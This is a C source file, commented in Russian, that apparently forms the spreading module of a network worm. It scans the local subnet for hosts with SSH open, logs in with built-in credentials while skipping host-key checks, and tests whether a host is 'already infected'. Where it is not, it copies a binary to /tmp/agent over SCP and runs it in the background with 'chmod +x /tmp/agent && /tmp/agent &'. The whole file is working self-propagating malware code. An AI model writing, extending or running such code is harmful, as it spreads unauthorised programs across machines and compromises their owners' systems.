#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <fcntl.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <libssh2.h>

#include "network_transport.h"

// Сканирование

static int get_local_subnet(char *local_ip, size_t ip_len,
                            char *netmask, size_t nm_len) {
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return -1;
    }
    for (ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET)
            continue;
        struct sockaddr_in *sin = (struct sockaddr_in *)ifa->ifa_addr;
        if (sin->sin_addr.s_addr == htonl(INADDR_LOOPBACK))
            continue;
        struct sockaddr_in *nm = (struct sockaddr_in *)ifa->ifa_netmask;
        inet_ntop(AF_INET, &sin->sin_addr, local_ip, ip_len);
        inet_ntop(AF_INET, &nm->sin_addr, netmask, nm_len);
        freeifaddrs(ifaddr);
        return 0;
    }
    freeifaddrs(ifaddr);
    return -1;
}

static void get_network_range(const char *ip_str, const char *mask_str,
                              uint32_t *network, uint32_t *broadcast) {
    struct in_addr ip, mask;
    inet_pton(AF_INET, ip_str, &ip);
    inet_pton(AF_INET, mask_str, &mask);
    uint32_t ip_i = ntohl(ip.s_addr);
    uint32_t mask_i = ntohl(mask.s_addr);
    *network = ip_i & mask_i;
    *broadcast = ip_i | ~mask_i;
}

static int tcp_connect_check(const char *ip_str, int port, int timeout_ms) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 0;

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip_str, &addr.sin_addr);

    int res = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    if (res < 0 && errno != EINPROGRESS) {
        close(sock);
        return 0;
    }

    fd_set wset;
    FD_ZERO(&wset);
    FD_SET(sock, &wset);
    struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
    res = select(sock + 1, NULL, &wset, NULL, &tv);
    if (res <= 0) {
        close(sock);
        return 0;
    }

    int err = 0;
    socklen_t len = sizeof(err);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &len);
    close(sock);
    return (err == 0);
}

int scan_local_subnet(char ***out_hosts) {
    char local_ip[INET_ADDRSTRLEN];
    char netmask[INET_ADDRSTRLEN];

    if (get_local_subnet(local_ip, sizeof(local_ip), netmask, sizeof(netmask)) != 0) {
        fprintf(stderr, "[SCAN] Cannot determine local subnet\n");
        return -1;
    }
    printf("[SCAN] Local IP: %s, Netmask: %s\n", local_ip, netmask);

    uint32_t network, broadcast;
    get_network_range(local_ip, netmask, &network, &broadcast);

    uint32_t start = network + 1;
    uint32_t end = broadcast - 1;
    if (end - start > 253) end = start + 253;

    printf("[SCAN] Range: %u.%u.%u.%u - %u.%u.%u.%u\n",
           (start>>24)&0xFF, (start>>16)&0xFF, (start>>8)&0xFF, start&0xFF,
           (end>>24)&0xFF, (end>>16)&0xFF, (end>>8)&0xFF, end&0xFF);

    char **hosts = calloc(MAX_HOSTS, sizeof(char*));
    if (!hosts) {
        perror("calloc");
        return -1;
    }

    int found = 0;
    for (uint32_t ip_i = start; ip_i <= end; ip_i++) {
        struct in_addr ip_addr;
        ip_addr.s_addr = htonl(ip_i);
        char ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &ip_addr, ip_str, sizeof(ip_str));

        if (strcmp(ip_str, local_ip) == 0) {
            printf("[SCAN] Skipping own IP %s\n", ip_str);
            continue;
        }

        if (tcp_connect_check(ip_str, 22, 200)) {
            printf("[SCAN] Found SSH: %s\n", ip_str);
            if (found < MAX_HOSTS) {
                hosts[found] = strdup(ip_str);
                found++;
            } else {
                fprintf(stderr, "[SCAN] Maximum hosts reached\n");
            }
        }
    }

    *out_hosts = hosts;
    return found;
}

void free_hosts_list(char **hosts, int count) {
    if (!hosts) return;
    for (int i = 0; i < count; i++)
        free(hosts[i]);
    free(hosts);
}

/*
 * Создаёт TCP-сокет, подключается к ip:port с таймаутом timeout_ms,
 * после успеха переводит сокет в блокирующий режим.
 * Возвращает сокет или -1 при ошибке.
 */
static int tcp_connect_timeout(const char *ip, int port, int timeout_ms) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    int res = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    if (res < 0 && errno != EINPROGRESS) {
        close(sock);
        return -1;
    }

    fd_set wset;
    FD_ZERO(&wset);
    FD_SET(sock, &wset);
    struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
    res = select(sock + 1, NULL, &wset, NULL, &tv);
    if (res <= 0) {
        close(sock);
        return -1;
    }

    int err = 0;
    socklen_t len = sizeof(err);
    if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &len) < 0 || err != 0) {
        close(sock);
        return -1;
    }

    fcntl(sock, F_SETFL, flags & ~O_NONBLOCK);
    return sock;
}

/*
 * Проверяет, существует ли уже на удалённом хосте файл /tmp/agent.
 * Использует готовое SSH-соединение (session уже аутентифицирована).
 * Возвращает 1, если файл есть, 0 если нет, -1 при ошибке.
 */
static int remote_file_exists(LIBSSH2_SESSION *session) {
    LIBSSH2_CHANNEL *channel = libssh2_channel_open_session(session);
    if (!channel) {
        fprintf(stderr, "[SSH] Cannot open channel for existence check\n");
        return -1;
    }

    if (libssh2_channel_exec(channel, "test -f " REMOTE_AGENT_PATH) != 0) {
        fprintf(stderr, "[SSH] exec(test) failed\n");
        libssh2_channel_free(channel);
        return -1;
    }

    libssh2_channel_close(channel);
    int exitcode = libssh2_channel_get_exit_status(channel);
    libssh2_channel_free(channel);

    return (exitcode == 0) ? 1 : 0;
}

/*
 * ssh_deploy – копирует бинарник на target_ip и запускает его удалённо.
 * Выполняет:
 *   - TCP-подключение к 22 порту
 *   - SSH-рукопожатие (без проверки host key)
 *   - Аутентификацию по паролю (SSH_USERNAME/SSH_PASSWORD)
 *   - Проверку наличия /tmp/agent (если уже есть – пропускает копирование и запуск)
 *   - При отсутствии — передачу файла через SCP и выполнение команды:
 *     chmod +x /tmp/agent && /tmp/agent &
 * Возвращает 0 при успехе, -1 при ошибке.
 */
int ssh_deploy(const char *target_ip, const char *binary_path) {
    int sock = -1;
    LIBSSH2_SESSION *session = NULL;
    LIBSSH2_CHANNEL *channel = NULL;
    int rc = -1;

    // TCP с таймаутом
    sock = tcp_connect_timeout(target_ip, 22, 3000);
    if (sock < 0) {
        fprintf(stderr, "[SSH] TCP connect to %s failed\n", target_ip);
        return -1;
    }

    // Инициализация библиотеки
    if (libssh2_init(0) != 0) {
        fprintf(stderr, "[SSH] libssh2_init failed\n");
        goto cleanup;
    }

    session = libssh2_session_init();
    if (!session) {
        fprintf(stderr, "[SSH] session_init failed\n");
        goto cleanup;
    }

    libssh2_session_set_timeout(session, 10000);

    // SSH-рукопожатие (без строгой проверки ключа хоста)
    if (libssh2_session_handshake(session, sock)) {
        fprintf(stderr, "[SSH] Handshake with %s failed\n", target_ip);
        goto cleanup;
    }

    // Аутентификация по логину/паролю
    if (libssh2_userauth_password(session, SSH_USERNAME, SSH_PASSWORD)) {
        fprintf(stderr, "[SSH] Authentication failed for %s@%s\n",
                SSH_USERNAME, target_ip);
        goto cleanup;
    }

    // Защита от повторного заражения
    int exists = remote_file_exists(session);
    if (exists == 1) {
        printf("[SSH] %s already infected, skipping copy and run\n", target_ip);
        rc = 0;
        goto cleanup;
    } else if (exists < 0) {
        fprintf(stderr, "[SSH] Could not check remote file, proceeding\n");
    }

    // SCP-передача бинарника
    struct stat st;
    if (stat(binary_path, &st) < 0) {
        perror("stat binary");
        goto cleanup;
    }

    channel = libssh2_scp_send(session, REMOTE_AGENT_PATH,
                               st.st_mode & 0777, (unsigned long)st.st_size);
    if (!channel) {
        fprintf(stderr, "[SSH] scp_send to %s failed\n", target_ip);
        goto cleanup;
    }

    FILE *f = fopen(binary_path, "rb");
    if (!f) {
        perror("fopen binary");
        libssh2_channel_free(channel);
        goto cleanup;
    }

    char buf[8192];
    size_t nread;
    while ((nread = fread(buf, 1, sizeof(buf), f)) > 0) {
        ssize_t written = 0;
        while (written < (ssize_t)nread) {
            ssize_t wr = libssh2_channel_write(channel, buf + written, nread - written);
            if (wr < 0) {
                fprintf(stderr, "[SSH] SCP write error\n");
                fclose(f);
                libssh2_channel_free(channel);
                goto cleanup;
            }
            written += wr;
        }
    }
    fclose(f);

    libssh2_channel_send_eof(channel);
    libssh2_channel_wait_eof(channel);
    libssh2_channel_wait_closed(channel);
    libssh2_channel_free(channel);
    channel = NULL;

    printf("[SSH] Binary sent to %s:%s\n", target_ip, REMOTE_AGENT_PATH);

    // Удалённый запуск скопированного бинарника
    channel = libssh2_channel_open_session(session);
    if (!channel) {
        fprintf(stderr, "[SSH] Cannot open channel for remote exec\n");
        goto cleanup;
    }

    const char *cmd = "chmod +x " REMOTE_AGENT_PATH " && " REMOTE_AGENT_PATH " &";
    if (libssh2_channel_exec(channel, cmd) != 0) {
        fprintf(stderr, "[SSH] Remote exec failed on %s\n", target_ip);
        libssh2_channel_free(channel);
        goto cleanup;
    }

    // Закрываем канал
    libssh2_channel_close(channel);
    libssh2_channel_wait_closed(channel);
    libssh2_channel_free(channel);
    channel = NULL;

    printf("[SSH] Agent launched on %s\n", target_ip);
    rc = 0;

cleanup:
    if (channel) libssh2_channel_free(channel);
    if (session) {
        libssh2_session_disconnect(session, "bye");
        libssh2_session_free(session);
    }
    if (sock >= 0) close(sock);
    libssh2_exit();
    return rc;
}